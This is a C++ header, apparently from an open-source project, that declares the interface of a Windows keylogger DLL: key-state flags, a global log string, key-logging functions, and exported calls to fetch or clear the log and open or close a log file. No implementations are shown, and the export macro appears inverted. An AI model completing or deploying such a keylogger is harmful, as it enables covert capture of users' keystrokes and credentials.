// This is an open source non-commercial project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
#pragma once

//global key state flags
inline bool shiftDown = false;
inline bool capsToggled = false;
inline bool numlockToggled = false;

#ifdef KEYLOGGER_EXPORTS
#define LOGLIB_API __declspec(dllimport)
#else
#define LOGLIB_API __declspec(dllexport)
#endif

#ifndef DLL_INCLUDES
#define DLL_INCLUDES
#include <Windows.h>
#include <thread>
#include <string>
#include <string_view>
#endif

//global log string
inline std::string logStr;


inline int sizeOfLogStr = 0;

void SetGlobalKeyStates();

void PrintSpecialKeys(const DWORD& key, const bool& shiftState);

void PrintDigits(const DWORD& key, const bool& shiftState);

void PrintAlpha(const DWORD& key, const bool&& upper);

void LogKeys(const std::string_view&&);

void LogKeys(const DWORD&&);

void LogDigit(const DWORD&&);

extern "C++" LOGLIB_API inline std::string GetLog();

extern "C++" LOGLIB_API inline void ClearLogStr();

extern "C++" LOGLIB_API inline int GetSizeOfLogStr();

extern "C++" LOGLIB_API inline void InitFile();

extern "C++" LOGLIB_API inline void CloseFile();